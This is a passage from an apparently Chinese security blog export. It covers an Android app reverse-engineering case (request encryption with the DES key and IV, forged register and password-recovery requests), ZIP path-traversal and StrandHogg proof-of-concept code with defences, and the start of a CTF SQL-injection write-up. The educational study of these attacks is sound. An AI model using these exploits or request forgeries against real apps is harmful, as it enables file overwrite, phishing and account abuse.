<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230811131952019.png" class title="image-20230811131952019">

<p>创建JsonRequest对象，当符合指定路由的时候设置用户和手机号码参数调用注册组件，然后调用addRequestMap函数和DodonewOnlineApplication.addRequest函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">his.request.addRequestMap(para);</span><br><span class="line">        DodonewOnlineApplication.addRequest(this.request, this);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里调用的addRequestMap函数和登录接口不同，重载只有一个参数，将useDes设置为真，调用paraMap函数</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230811135425554.png" class title="image-20230811135425554">

<p>继续跟进paraMap函数，构造addMap2参数(timeStamp、userid、imei),然后调用RequestUtil.encodeDesMap函数</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230811135552417.png" class title="image-20230811135552417">

<p>下面getCode函数为获取验证码功能，与注册功能不同的是para构造参数只有mobile这一参数</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230811192950931.png" class title="image-20230811192950931">



<p>前面以及对“注册“和”获取验证码“这两个按钮事件进行了分析，接下来我们分析”找回密码”按钮事件，这里直接开启了FindPasswordActivity</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">startActivity(new Intent(this,FindPasswordActivity.class));</span><br></pre></td></tr></table></figure>

<p>跟进FindPasswordActivity类，里面的click函数为重要逻辑代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">switch (this.position) &#123;</span><br><span class="line">            case TTransportException.f7557b /*1*/:</span><br><span class="line">                this.mobile = this.step1.getMobile();</span><br><span class="line">                if (Utils.isMobileNO(this.mobile)) &#123;</span><br><span class="line">                    this.isAgain = false;</span><br><span class="line">                    sendMobileCode(this.mobile);</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">           showToast(&quot;\u8bf7\u8f93\u5165\u6b63\u786e\u7684\u624b\u673a\u53f7.&quot;);</span><br><span class="line">                return;</span><br><span class="line">                //验证手机号并发送验证码</span><br><span class="line">            case TTransportException.f7558c /*2*/:</span><br><span class="line">                String code = this.step2.getCode();</span><br><span class="line">                if (TextUtils.isEmpty(code)) &#123;</span><br><span class="line">                    showToast(&quot;\u8bf7\u8f93\u5165\u9a8c\u8bc1\u7801.&quot;);</span><br><span class="line">                    return;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    verificationCode(this.mobile, code);</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                //验证判断信息</span><br><span class="line">            case TTransportException.f7559d /*3*/:</span><br><span class="line">                String newPwd = this.step3.getNewPwd();</span><br><span class="line">                if (TextUtils.isEmpty(newPwd)) &#123;</span><br><span class="line">                    showToast(&quot;\u8bf7\u8f93\u5165\u65b0\u5bc6\u7801&quot;);</span><br><span class="line">                    return;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    modifyNewPwd(this.mobile, newPwd, this.phoneCode.getToken());</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                //修改密码</span><br></pre></td></tr></table></figure>

<p>接下来就和登录接口流程是一样的</p>
<h3 id="还原加密-1"><a href="#还原加密-1" class="headerlink" title="还原加密"></a>还原加密</h3><h4 id="注册功能"><a href="#注册功能" class="headerlink" title="注册功能"></a>注册功能</h4><p>编写js脚本获取输入处理的参数以及经过encodeDesMap函数后的加密数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">encodeDesMap is called, data: &#123;&quot;equtype&quot;:&quot;ANDROID&quot;,&quot;loginImei&quot;:&quot;Android351564715931416&quot;,&quot;mobileCode&quot;:&quot;123456&quot;,&quot;phone&quot;:&quot;18148411953&quot;,&quot;sign&quot;:&quot;DF249AC067B2097E07BDFD4329B95D4B&quot;,&quot;timeStamp&quot;:&quot;1691735134838&quot;,&quot;userPwd&quot;:&quot;admin&quot;&#125;, desKey: 65102933, desIV: 32028092</span><br><span class="line"></span><br><span class="line">encodeDesMap ret value is NIszaqFPos1vd0pFqKlB42Np5itPxaNH//FDsRnlBfgL4lcVxjXii7mUQQsI1NkwwCI4HVgshTOW</span><br><span class="line">qpHE8q4N8iEDukVF0C9p4xJVE7Km+zijcNlqK038YX5CRUp5A8oy+UVl7otgB3QAcgbw2mrGvsUi</span><br><span class="line">kMJr1V+9/Lvs7Bgj8JWrl6vLlvqcknHWaYN4O+pJBSKxY83p40f/SNvHAwGsZvNA0f436GxGDHv7</span><br><span class="line">+o8Z/gt9MsZTK5oyQJy3Ogma7mbW2</span><br></pre></td></tr></table></figure>



<p>该app的所有http请求加密过程都是同一个加密过程，根据编写加密脚本来验证加密数据，执行结果如下，完全符合</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230811152139079.png" class title="image-20230811152139079">

<h4 id="找回密码"><a href="#找回密码" class="headerlink" title="找回密码"></a>找回密码</h4><p>获取验证码时只对手机号码、时间戳和固定的字符串计算md5值</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230811195646390.png" class title="image-20230811195646390">

<p>判断验证时对验证码、手机号码、时间戳和固定的字符串计算MD5值</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230811195825714.png" class title="image-20230811195825714">

<h3 id="模拟请求-1"><a href="#模拟请求-1" class="headerlink" title="模拟请求"></a>模拟请求</h3><p>模拟请求代码和上面登录接口代码一样，只需修改进行计算md5值的字符串和进行DES加密的字符串即可，这里只对返回信息进行Hook解密</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230811163235863.png" class title="image-20230811163235863">

<p>获取验证码返回信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;code&quot;:1,&quot;message&quot;:&quot;验证码已发送&quot;,&quot;data&quot;:&#123;&quot;message&quot;:&quot;验证码已发送&quot;,&quot;code&quot;:1&#125;&#125;</span><br></pre></td></tr></table></figure>



<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230811163425478.png" class title="image-20230811163425478">

<p>注册返回信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;code&quot;:0,&quot;message&quot;:&quot;验证码错误或者已过期&quot;,&quot;data&quot;:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>逆向分析</category>
        <category>android</category>
        <category>案例分析</category>
      </categories>
      <tags>
        <tag>-逆向 -android</tag>
      </tags>
  </entry>
  <entry>
    <title>Android常见漏洞总结</title>
    <url>/2023/03/12/Android%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="Android常见漏洞总结"><a href="#Android常见漏洞总结" class="headerlink" title="Android常见漏洞总结"></a>Android常见漏洞总结</h1><h2 id="文件解压漏洞"><a href="#文件解压漏洞" class="headerlink" title="文件解压漏洞"></a>文件解压漏洞</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>由于压缩文件ZIP类型的压缩包文件名允许存在特殊字符，没有格式要求，在Android系统中攻击者可以精心构造ZIP文件，利用多个..&#x2F;来改变ZIP包中某个文件的存放位置，以替换原有文件的目的。如果被替换掉的文件是是 .so、.dex 或 .odex 类型文件，那么攻击者就可以轻易更改原有的代码逻辑，轻则产生本地拒绝服务漏洞，影响应用的可用性，重则可能造成任意代码执行漏洞，危害应用用户的设备安全和信息安全。比如寄生兽漏洞、海豚浏览器远程命令执行漏洞和三星默认输入法远程代码执行等著名的安全事件。</p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Java 代码在解压 ZIP 文件时，会使用到 ZipEntry 类的 getName() 方法，如果 ZIP 文件中包含 “..&#x2F;” 的字符串，该方法返回值里面原样返回，如果没有过滤掉 getName() 返回值中的 “..&#x2F;” 字符串，继续解压缩操作，就会在其他目录中创建解压的文件。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>下面的代码是将位于程序包下的test.zip文件解压缩到本目录下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">ActionBarActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String TAG = <span class="string">&quot;MainActivity&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button button_Activity1 = (Button) findViewById(R.id.button);</span><br><span class="line">        button_Activity1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                String zipPath = getApplicationContext().getCacheDir()+<span class="string">&quot;/test.zip&quot;</span>; <span class="comment">//压缩包路径</span></span><br><span class="line">                String unzipPath = getApplicationContext().getCacheDir().toString(); <span class="comment">//解压路径</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    unzipFile(zipPath,unzipPath);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)</span><br><span class="line">                &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">unzipFile</span><span class="params">(String zipPath,String outputDirectory)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Log.i(TAG,<span class="string">&quot;解压文件: &quot;</span>+zipPath+<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;解压文件: &quot;</span>+outputDirectory);</span><br><span class="line">        File file = <span class="keyword">new</span> File(outputDirectory); <span class="comment">//创建解压目录对象实例化</span></span><br><span class="line">        <span class="keyword">if</span>(!file.exists())</span><br><span class="line">        &#123;</span><br><span class="line">            file.mkdir();<span class="comment">//不存在则创建</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//读取压缩文件</span></span><br><span class="line">        InputStream inputStream = <span class="keyword">new</span> FileInputStream(zipPath);</span><br><span class="line">        ZipInputStream zipInputStream = <span class="keyword">new</span> ZipInputStream(inputStream);</span><br><span class="line">        ZipEntry zipEntry = zipInputStream.getNextEntry(); <span class="comment">//读取一个进入点</span></span><br><span class="line">        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>*<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;<span class="comment">//记录解压字节数</span></span><br><span class="line">        <span class="keyword">while</span>(zipEntry !=<span class="keyword">null</span>)<span class="comment">//遍历文件和目录</span></span><br><span class="line">        &#123;</span><br><span class="line">            Log.i(TAG,<span class="string">&quot;解压文件 入口 1： &quot;</span> +zipEntry );</span><br><span class="line">            <span class="keyword">if</span> (!zipEntry.isDirectory()) &#123;  <span class="comment">//如果是一个文件</span></span><br><span class="line">                <span class="comment">// 如果是文件</span></span><br><span class="line">                String fileName = zipEntry.getName();</span><br><span class="line">                <span class="comment">//Log.i(TAG,&quot;解压文件 原来 文件的位置： &quot; + fileName);</span></span><br><span class="line">                <span class="comment">//fileName = fileName.substring(fileName.lastIndexOf(&quot;/&quot;) + 1);  //截取文件的名字 去掉原文件夹名字</span></span><br><span class="line">                Log.i(TAG,<span class="string">&quot;解压文件 的名字： &quot;</span> + fileName);</span><br><span class="line">                file = <span class="keyword">new</span> File(outputDirectory + File.separator + fileName);  <span class="comment">//放到新的解压的文件路径</span></span><br><span class="line">                file.createNewFile();</span><br><span class="line">                FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">                <span class="keyword">while</span> ((count = zipInputStream.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    fileOutputStream.write(buffer, <span class="number">0</span>, count);</span><br><span class="line">                &#125;</span><br><span class="line">                fileOutputStream.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 定位到下一个文件入口</span></span><br><span class="line">            zipEntry = zipInputStream.getNextEntry();</span><br><span class="line">            Log.i(TAG,<span class="string">&quot;解压文件 入口 2： &quot;</span> + zipEntry );</span><br><span class="line">        &#125;</span><br><span class="line">        zipInputStream.close();</span><br><span class="line">        Log.i(TAG,<span class="string">&quot;解压完成&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来将..&#x2F;test.txt的文件进行压缩保存为test.zip</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zip</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            binary = f.read()</span><br><span class="line">            zipFile = zipfile.ZipFile(<span class="string">&quot;test.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)</span><br><span class="line">            zipFile.writestr(<span class="string">&quot;../test.txt&quot;</span>, binary)</span><br><span class="line">            zipFile.close()</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">zip</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>压缩成了test.zip，可以看到里面的为..&#x2F;test.txt文件</p>
<img src="/2023/03/12/Android%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20231017190848855.png" class title="image-20231017190848855">

<p>运行程序后，查看文件夹中变化，可以看到test.txt文件解压到了上一层目录下</p>
<img src="/2023/03/12/Android%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20231017192135761.png" class title="image-20231017192135761">

<h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>针对上述 ZIP 文件解压缩的目录穿越导致文件覆盖漏洞，修复建议如下：</p>
<ul>
<li>对重要的 ZIP 压缩包文件进行数字签名校验，校验通过才进行解压。</li>
<li>检查 Zip 压缩包中使用 ZipEntry.getName() 获取的文件名中是否包含 ..&#x2F; 或者 ..，检查 ..&#x2F; 的时候不必进行 URI Decode（以防通过URI编码 ..%2F 来进行绕过），测试发现 ZipEntry.getName() 对于 Zip 包中有 ..%2F 的文件路径不会进行处理。</li>
</ul>
<p>Google建议的修复方案：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InputStream is = new InputStream(untrustedFileName);</span><br><span class="line">ZipInputStream zis = new ZipInputStream(new BufferedInputStream(is));</span><br><span class="line">while((ZipEntry ze = zis.getNextEntry()) != null) &#123;</span><br><span class="line">  File f = new File(DIR, ze.getName());</span><br><span class="line">  String canonicalPath = f.getCanonicalPath();</span><br><span class="line">  if (!canonicalPath.startsWith(DIR)) &#123;</span><br><span class="line">    // SecurityException</span><br><span class="line">  &#125;</span><br><span class="line">  // Finish unzipping…</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="StrandHogg漏洞"><a href="#StrandHogg漏洞" class="headerlink" title="StrandHogg漏洞"></a>StrandHogg漏洞</h2><h3 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>该漏洞允许攻击者冒充任意合法应用,诱导受害者授予恶意应用权限或者进行恶意钓鱼攻击。由于该漏洞允许恶意软件劫持合法应用的活动,并将自身恶意活动插入在合法活动之前使得用户并没有意识到自己已经遭到攻击。至2020年1月26日,经过测试,该漏洞影响Android全版本,包括目前最新的Android10。</p>
<h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>任务栈是指一堆activity的集合，以堆栈方式存放，一个任务栈中可以包含多个activity，可以来自不同应用。从一个acitivy启动新的一个activity时就会把前一个activity压入返回堆栈中。这个漏洞用到了android的两个属性taskAffinity和allowTaskReparenting。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">taskAffinity（任务相似性）：用来标识activity与任务的联系，该属性如果没有被设置，就从自身的 Application 继承，Application 的taskAffinity，它的值为 Manifest 的包名，也就是taskAffinity默认属性为自身应用包名的字符串</span><br><span class="line"></span><br><span class="line">allowTaskReparenting（任务重编）：这个属性会使该activity具有在任务栈被重新编排的能力，当下一次将启动 activity 的任务转至前台时， activity 是否可以从启动它的任务移动到和它具有相同taskAffinity属性的任务，转移的时机是在具有相同taskAffinity属性的任务转移到前台时，true代表能够移动，并且false如果它必须留在它所在的任务中。</span><br></pre></td></tr></table></figure>

<p>因为大部分应用的taskAffinity属性都没有设置，默认为其包名，那么就可以通过一个在恶意软件的一个hackactivity属性中设置跟我们攻击的应用的包名一致的taskAffinity值。</p>
<p>那么该hackactivitystart的时候就会创建一个与victim应用的taskAffinity属性相同的一个任务栈，到时候会和victim的应用共享一个任务栈，并且位于该任务栈的根，在我们启动受害应用时，该victim的任务就会被放到前台，然后位于根的hackactivity就会放到前台。</p>
<p>那么当我们打开受害应用所看到的activity，并不是该应用原有的activity，而是我们的hackactivity，那么我们可以在hackactivity设计成一个钓鱼页面，实现钓鱼攻击，获取用户的隐私和诱导用户授予恶意软件相应权限。</p>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现需要一个正常的APP和一个包含攻击代码的APP。</p>
<p>正常合法app如下图所示，一个很简单的只有输出”Hello World！”的图形界面</p>
<img src="/2023/03/12/Android%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20231017194144487.png" class title="image-20231017194144487">

<p>接下来新建一个利用此漏洞的恶意软件项目，需要新建两个布局，布局代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">activity_main.xml//只显示Innocent字符串</span><br><span class="line">&lt;linearlayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</span><br><span class="line">    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;</span><br><span class="line">    xmlns:tools=&quot;http://schemas.android.com/tools&quot;</span><br><span class="line">    android:layout_width=&quot;match_parent&quot;</span><br><span class="line">    android:layout_height=&quot;match_parent&quot;</span><br><span class="line">    tools:context=&quot;.MainActivity&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;textview</span><br><span class="line">        android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">        android:text=&quot;Innocent&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/textview&gt;</span><br><span class="line">&lt;/linearlayout&gt;</span><br><span class="line"></span><br><span class="line">attack.xml//显示Attack Success!字符串，这里为攻击成功后显示的</span><br><span class="line">&lt;linearlayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</span><br><span class="line">    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;</span><br><span class="line">    xmlns:tools=&quot;http://schemas.android.com/tools&quot;</span><br><span class="line">    android:layout_width=&quot;match_parent&quot;</span><br><span class="line">    android:layout_height=&quot;match_parent&quot;</span><br><span class="line">    tools:context=&quot;.MainActivity&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;textview</span><br><span class="line">        android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">        android:text=&quot;Attack Success!&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/textview&gt;</span><br><span class="line">&lt;/linearlayout&gt;</span><br></pre></td></tr></table></figure>

<p>上面设计两个布局界面的原因是为了隐藏恶意代码攻击成功的意图,接下来就编写代码显示上面上个布局</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">ActionBarActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="comment">//setContentView(R.layout.activity_main);</span></span><br><span class="line">        Intent innocent,attack;</span><br><span class="line">        attack=<span class="keyword">new</span> Intent(<span class="keyword">this</span>,Attack.class);</span><br><span class="line">        attack.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);<span class="comment">//将attack活动放置在一个新task中</span></span><br><span class="line">        attack.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);<span class="comment">//取消过度动画,增加恶意软件迷惑性</span></span><br><span class="line">        innocent=<span class="keyword">new</span> Intent(<span class="keyword">this</span>,Innocent.class);</span><br><span class="line">        innocent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">        startActivities(<span class="keyword">new</span> Intent[]&#123;attack,innocent&#125;);<span class="comment">//先后启动attack活动与innocent活动</span></span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先创建了成员变量分别为innocent,attack的两个Intent对象，attack和innocent都带上了FLAG_ACTIVITY_NEW_TASK这个Flag，带上该Flag的Intent创建的活动都会在各自的任务栈中,互不影响。其中attack还带有FLAG_ACTIVITY_NO_ANIMATION这个flag，带有该Flag的Intent创建的活动将不显示过度动画。</p>
<p>接着我调用了startActivities方法先后启动attack和innocent这两个活动注意,Innocent这个活动在Attack启动之后才被启动,在活动先后顺序上,Innocent在最顶层，所以用户最终看到的活动只有Innocent这个无害活动，而Attack启动时取消了过度动画,除了个别机型会有稍微闪动外,在启动时无明显变化,从而增加了恶意软件迷惑性。</p>
<p>攻击者要怎么利用漏洞将恶意活动插入到合法活动之前呢？这里就要用到AndroidManifest.xml中编辑配置文件，将taskAffinity属性就是欲攻击应用的包名，allowTaskReparenting属性为true。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;activity</span><br><span class="line">            android:name=&quot;.MainActivity&quot;</span><br><span class="line">            android:label=&quot;@string/app_name&quot; &gt;</span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;</span><br><span class="line"></span><br><span class="line">                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">        &lt;/activity&gt;&lt;activity android:name=&quot;.Innocent&quot;&gt;</span><br><span class="line">        &lt;activity</span><br><span class="line">            android:allowtaskreparenting=&quot;true&quot;</span><br><span class="line">            android:name=&quot;.Attack&quot;</span><br><span class="line">            android:taskaffinity=&quot;com.victim.app&quot;&gt;</span><br><span class="line">        &lt;!--</span><br><span class="line">        其中欲插入到合法活动前的恶意活动的taskAffinity属性就是欲攻击应用的包名</span><br><span class="line">        allowTaskReparenting属性为true</span><br><span class="line">        --&gt;</span><br><span class="line">    &lt;/application&gt;</span><br></pre></td></tr></table></figure>



<h3 id="漏洞防御-1"><a href="#漏洞防御-1" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>现在taskAffinity属性只对相同UID的应用有效，也就是说，只有共享UID的应用才可以进行activity的移动，uid在应用安装时被分配，并且在应用存在于手机上期间，都不会改变。</p>
<p>一个应用程序只能有一个uid，多个应用可以使用sharedUserId 方式共享同一个uid，但前提是这些应用的签名要相同。恶意应用也无法伪造uid，导致无法实现攻击。</p>
]]></content>
      <categories>
        <category>逆向分析</category>
        <category>android</category>
      </categories>
      <tags>
        <tag>-逆向 -android</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF练习-Web系列-SQLI（二）</title>
    <url>/2022/04/02/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h1 id="CTF练习-Web系列-SQLI（二）"><a href="#CTF练习-Web系列-SQLI（二）" class="headerlink" title="CTF练习-Web系列-SQLI（二）"></a>CTF练习-Web系列-SQLI（二）</h1><p>infantsql这道题是前一道题的升级版本，只是在前端调用JSEncrpy第三方库利用公钥进行RSA加密id参数。</p>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h3><p>首先对其搜索框进行注入点探测，可以看到id参数进行了加密</p>
<img src="/2022/04/02/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%BA%8C%EF%BC%89/image-20220329145503383.png" class title="image-20220329145503383">



<p>然后查看题目前端 JS代码如何加密id参数,可以看到前端调用 JSEncrpy第三方库使用公钥对id参数进行加密处理  。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSubmitForm</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pkey = <span class="string">&quot;-----BEGIN PUBLIC KEY-----\n&quot;</span>+</span><br><span class="line">        <span class="string">&quot;MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDIk4a0KYnqOLmJPxNGQkotihoo\n&quot;</span>+</span><br><span class="line">        <span class="string">&quot;994QXmk+7M8WCS5U7kWdhfMqiyjpKzuMaRB8Aydo2bbTNjHhATTRTUIvlpqNzEob\n&quot;</span>+</span><br><span class="line">        <span class="string">&quot;CSWuNFc3j3Nlk/I5ySdFo0INzlHnJtbwKQoHon0ctmyffovYNg5Ar8LPz6RbsiA7\n&quot;</span>+</span><br><span class="line">        <span class="string">&quot;3Ic4McekZIkdJH08cwIDAQAB\n&quot;</span>+</span><br><span class="line">        <span class="string">&quot;-----END PUBLIC KEY-----&quot;</span></span><br><span class="line">    <span class="keyword">var</span> ajax = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    ajax.open(<span class="string">&#x27;POST&#x27;</span>,<span class="string">&quot;/graphql&quot;</span>);</span><br><span class="line">    ajax.setRequestHeader(<span class="string">&quot;content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded; charset=utf-8&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> id = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;id&#x27;</span>).value;</span><br><span class="line">    <span class="keyword">var</span> encrypt = <span class="keyword">new</span> JSEncrypt();</span><br><span class="line">    encrypt.setPublicKey(pkey);</span><br><span class="line">    id = encrypt.encrypt(id);</span><br><span class="line">    id =  <span class="built_in">window</span>.btoa(id);</span><br><span class="line">    ajax.send(<span class="string">&quot;query=&#123;getscorewithid(id:\&quot;&quot;</span>+id+<span class="string">&quot;\&quot;)&#123; id name score &#125;&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ajax.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (ajax.readyState==<span class="number">4</span> &amp;&amp; ajax.status==<span class="number">200</span>) &#123;</span><br><span class="line">            alert(ajax.responseText);</span><br><span class="line">      　&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来的步骤和第一道是一样的，查询出存在的getscorewithname方法及其包含的参数name score</p>
<h3 id="注入测试"><a href="#注入测试" class="headerlink" title="注入测试"></a>注入测试</h3><p>在注入过程中只需要使用 上方JS给定的公钥进行加密处理，然后放进请求包中即可进行注入查询</p>
<p>js加密参数代码如下:</p>
